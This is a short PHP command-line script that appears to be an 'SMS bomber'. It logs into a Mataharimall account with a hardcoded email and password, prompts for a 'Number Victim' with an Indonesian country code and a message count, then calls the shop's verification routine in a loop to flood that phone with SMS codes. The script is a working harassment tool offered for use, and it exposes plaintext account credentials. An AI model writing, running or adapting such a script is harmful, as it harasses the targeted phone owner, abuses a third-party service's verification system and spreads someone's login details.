<?php
/*
    https://github.com/nee48/bomsmsmthrmall/
    Made by Handika Pratama
    Modified by まやちゃん
*/

include 'bommthrml.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "otosaka404@gmail.com";
$init->pass = "lingga123";
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber
echo "</> Number Victim (use 62) : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "</> Number Of Messages : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
